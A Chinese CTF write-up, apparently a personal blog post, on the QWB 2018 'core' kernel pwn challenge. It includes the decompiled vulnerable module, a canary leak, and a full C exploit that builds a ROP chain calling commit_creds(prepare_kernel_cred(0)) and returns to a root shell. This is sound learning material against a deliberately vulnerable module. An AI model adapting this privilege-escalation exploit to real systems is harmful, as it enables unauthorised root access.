---
title: kernel pwn
tags: [ctf-pwn,kernel]
date: 2023-12-19 13:40:00
categories: [ctf-pwn]
excerpt: kernel pwn

---

前置知识见[这篇](https://isolator-1.github.io/2023/12/13/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/OS/)，记录了控制流转移和cred的相关内容

### 镜像格式

`bzImage` ：适用于大于512kB的kernel，开头自带gzip的解压代码

`zImage` ：小于512kB的kernel

`vmlinux` ：静态链接的linux kernel可执行文件，压缩之后（添加解压代码）为`vmlinuz`，即`bzImage`或`zImage`



### 强网杯2018 - core

一道最简单的kernel pwn，是个rop题

从别人的博客下的文件：https://arttnba3.cn/download/qwb2018/pwn/core.7z

解压之后有`bzImage` `start.sh` `vmlinux` `core.cpio` 四个文件

先看`start.sh` 第一个参数`-m`指定虚拟机内存大小，一开始给的是64M，但是开不开机，所以要改大一点

```bash
qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
```

`-initrd`参数用于指定一个包含初始化 RAM disk（initramfs）的文件，这个文件将会在虚拟机启动时加载到内存中。在启动Linux内核时，initramfs通常包含用于引导、初始化和挂载根文件系统所需的文件和脚本。其他的参数就先不管了

`-nographic`删掉之后会卡在booting the kernel，不知道为啥

`-kernel` 指定内核镜像 

> 如果没给vmlinux，是可以从bzImage提取出来的，用torvalds linus写的shell scripts😮
> https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux

首先解压文件系统

```bash
mv core.cpio core.cpio.gz
gunzip ./core.cpio.gz 
cpio -idm < ./core.cpio
```

这样就把文件系统提取出来了

```bash
ubuntu@ubuntu:~/Desktop/give_to_player$ cd core
ubuntu@ubuntu:~/Desktop/give_to_player/core$ ls
bin      etc          init  lib64    proc  sbin  tmp  vmlinux
core.ko  gen_cpio.sh  lib   linuxrc  root  sys   usr
```

查看`init`

```shell
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2
insmod /core.ko

#poweroff -d 120 -f &    120秒之后自动关机，注释掉
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f           
```



其中```cat /proc/kallsyms > /tmp/kallsyms```把符号表复制了一份出来，这个`kallsyms`提供了kernel的符号表信息，把符号表复制到了tmp里，因此可以通过它来泄露`commit_creds`和`prepare_kernel_cred`（但因为开了kaslr，还要算偏移量）

```
/ $ cat /tmp/kallsyms 
0000000000000000 A irq_stack_union
0000000000000000 A __per_cpu_start
ffffffff91200000 T startup_64
ffffffff91200000 T _stext
ffffffff91200000 T _text
ffffffff91200030 T secondary_startup_64
ffffffff912000e0 T verify_cpu
ffffffff912001e0 T start_cpu0
ffffffff912001f0 T __startup_64
ffffffff91200370 T __startup_secondary_64
ffffffff91200380 t run_init_process
ffffffff912003b0 t try_to_run_init_process
ffffffff912003e0 t initcall_blacklisted
ffffffff912004a0 T do_one_initcall
ffffffff91200600 t match_dev_by_uuid
ffffffff91200630 T name_to_dev_t
```

> init 中，kptr_restrict = 1，不能直接读/proc/kallsyms
>
> 但是试了一下，发现还是可以通过cat读取符号表（没有root，uid还是1000）但是exp里改成proc之后kernel会崩溃

获取这两个函数地址的代码如下

```C
ksyms_file = fopen("/proc/kallsyms", "r");
if(ksyms_file == NULL) {
    puts("\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m");
    exit(-1);
}

while(fscanf(ksyms_file, "%lx%s%s", &addr, type, buf)) {
    if(prepare_kernel_cred && commit_creds) {
        break;
    }

    if(!commit_creds && !strcmp(buf, "commit_creds")) {
        commit_creds = addr;
        printf("\033[32m\033[1m"
               "[+] Successful to get the addr of commit_cread:"
               "\033[0m%lx\n", commit_creds);
        continue;
    }

    if(!strcmp(buf, "prepare_kernel_cred")) {
        prepare_kernel_cred = addr;
        printf("\033[32m\033[1m"
               "[+] Successful to get the addr of prepare_kernel_cred:"
               "\033[0m%lx\n", prepare_kernel_cred);
        continue;
    }
}
```



在init中，ismod加载了一个自定义的模块

> `insmod` 是 Linux 系统上用于加载内核模块的命令。`insmod` 命令允许你将一个预编译的内核模块插入（即加载）到运行的内核中。

用ida打开提取出来的core.ko

首先，这个程序在init module里创建了一个叫core的进程

找到core_ioctl，这个就是调用函数ioctl执行的代码

```c
__int64 __fastcall core_ioctl(__int64 a1, __int64 a2, __int64 a3)
{
  switch ( (_DWORD)a2 )
  {
    case 0x6677889B:
      core_read(a3);
      break;
    case 0x6677889C:
      printk(&unk_2CD, a3);
      off = a3;
      break;
    case 0x6677889A:
      printk(&unk_2B3, a2);
      core_copy_func(a3);
      break;
  }
  return 0LL;
}
```

实际的漏洞点在core_read里，它的参数，也就是ioctl的第三个参数，是用户态栈上的参数，向这个地址写入64个字节，可以用来泄露canary

```c
unsigned __int64 __fastcall core_read(__int64 a1, __int64 a2)
{
  char *v3; // rdi
  __int64 i; // rcx
  unsigned __int64 result; // rax
  char v6[64]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v7; // [rsp+40h] [rbp-10h]

  v7 = __readgsqword(0x28u);
  printk(&unk_25B, a2);
  printk(&unk_275, off);
  v3 = v6;
  for ( i = 16LL; i; --i )
  {
    *(_DWORD *)v3 = 0;
    v3 += 4;
  }
  strcpy(v6, "Welcome to the QWB CTF challenge.\n");
  result = copy_to_user(a1, &v6[off], 64LL);
  if ( !result )
    return __readgsqword(0x28u) ^ v7;
  __asm { swapgs }
  return result;
}
```

结合前面的ioctl，可以得到如下exp

```c
set_off_val(fd, 64);
core_read(fd, buf);
canary = ((size_t *)buf)[0];
```

在core write函数里，用户可以对着kernel stack进行写入（至多0x800字节），这里可以构造rop溢出

```c
    offset = commit_creds - 0xffffffff8109c8e0;   
    // 关于这个偏移量怎么算的，关掉kaslr，然后打开kallsyms，查看这个函数的地址
    // 但是ctf-wiki那个我没看懂，hex(vmlinux.sym['commit_creds'] - 0xffffffff81000000)我和它不一样，不知道它用的是哪个vmlinux，我用根目录下的那个是不对的
    for(i = 0; i < 10;i++) {
        rop_chain[i] = canary;
    }
    rop_chain[i++] = POP_RDI_RET + offset;
    rop_chain[i++] = 0;
    rop_chain[i++] = prepare_kernel_cred;
    rop_chain[i++] = POP_RDX_RET + offset;
    rop_chain[i++] = POP_RCX_RET + offset; // clear useless stack data
    rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop_chain[i++] = commit_creds;
    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
    rop_chain[i++] = 0;
    rop_chain[i++] = IRETQ + offset;
    rop_chain[i++] = (size_t)get_root_shell;
    rop_chain[i++] = user_cs;
    rop_chain[i++] = user_rflags;
    rop_chain[i++] = user_sp;
    rop_chain[i++] = user_ss;
```

这里要用到的rop是用ropper(pip3 install)算的，但是这个好像对性能要求很高（

```
time ~/.local/bin/ropper --file ./vmlinux --nocolor > g1
```

这个输出有24M😵‍💫



完整exp（还是抄的arttnba3大佬的）🐄🐄🐄🐄

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define POP_RDI_RET 0xffffffff81000b2f
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RCX_RET 0xffffffff81021e53
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define  IRETQ 0xffffffff81050ac2

size_t commit_creds = 0, prepare_kernel_cred = 0;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}

void get_root_shell(void)
{
    if(getuid()) {
        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
        exit(-1);
    }

    puts("\033[32m\033[1m"
         "[+] Successful to get the root. Execve root shell now..."
         "\033[0m");
    system("/bin/sh");
}

void core_read(int fd, char * buf)
{
    ioctl(fd, 0x6677889B, buf);
}

void set_off_val(int fd, size_t off)
{
    ioctl(fd, 0x6677889C, off);
}

void core_copy(int fd, size_t nbytes)
{
    ioctl(fd, 0x6677889A, nbytes);
}

int main(int argc, char ** argv)
{
    FILE *ksyms_file;
    int fd;
    char buf[0x50], type[0x10];
    size_t addr;
    size_t offset, canary;
    size_t rop_chain[0x100], i;

    puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
    save_status();

    fd = open("/proc/core", 2);
    if(fd <0) {
        puts("\033[31m\033[1m[x] Failed to open the /proc/core !\033[0m");
        exit(-1);
    }

    //get the addr
    ksyms_file = fopen("/tmp/kallsyms", "r");
    if(ksyms_file == NULL) {
        puts("\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m");
        exit(-1);
    }

    while(fscanf(ksyms_file, "%lx%s%s", &addr, type, buf)) {
        if(prepare_kernel_cred && commit_creds) {
            break;
        }

        if(!commit_creds && !strcmp(buf, "commit_creds")) {
            commit_creds = addr;
            printf("\033[32m\033[1m"
                   "[+] Successful to get the addr of commit_cread:"
        	   "\033[0m%lx\n", commit_creds);
            continue;
        }

        if(!strcmp(buf, "prepare_kernel_cred")) {
            prepare_kernel_cred = addr;
            printf("\033[32m\033[1m"
                   "[+] Successful to get the addr of prepare_kernel_cred:"
        	   "\033[0m%lx\n", prepare_kernel_cred);
            continue;
        }
    }

    offset = commit_creds - 0xffffffff8109c8e0;

    // get the canary
    set_off_val(fd, 64);
    core_read(fd, buf);
    canary = ((size_t *)buf)[0];

    //construct the ropchain
    for(i = 0; i < 10;i++) {
        rop_chain[i] = canary;
    }
    rop_chain[i++] = POP_RDI_RET + offset;
    rop_chain[i++] = 0;
    rop_chain[i++] = prepare_kernel_cred;
    rop_chain[i++] = POP_RDX_RET + offset;
    rop_chain[i++] = POP_RCX_RET + offset; // clear useless stack data
    rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + offset;
    rop_chain[i++] = commit_creds;
    rop_chain[i++] = SWAPGS_POPFQ_RET + offset;
    rop_chain[i++] = 0;
    rop_chain[i++] = IRETQ + offset;
    rop_chain[i++] = (size_t)get_root_shell;
    rop_chain[i++] = user_cs;
    rop_chain[i++] = user_rflags;
    rop_chain[i++] = user_sp;
    rop_chain[i++] = user_ss;

    write(fd, rop_chain, 0x800);
    core_copy(fd, 0xffffffffffff0000 | (0x100));
}
```

编译

```bash
gcc exploit.c -static -masm=intel -g -o exploit
```

这里不知道为什么我在kali 2023.3上编译出来的`exploit`，运行的时候`getuid()`确实变成0了，但是一执行`system("/bin/sh")`就`segmentation fault`，换到ubuntu20.04就好了😶‍🌫️

运行之后新启的shell uid为0

```bash
/ $ id
uid=1000(chal) gid=1000(chal) groups=1000(chal)
/ $ /tmp/exploit 
[*] Start to exploit...
[*] Status has been saved.
[+] Successful to get the addr of commit_cread:ffffffffbda9c8e0
[+] Successful to get the addr of prepare_kernel_cred:ffffffffbda9cce0
[+] Successful to get the root. Execve root shell now...
/ # id
uid=0(root) gid=0(root)
```



第一次做kernel pwn，还有好多好多细节没完全理解😭😭😭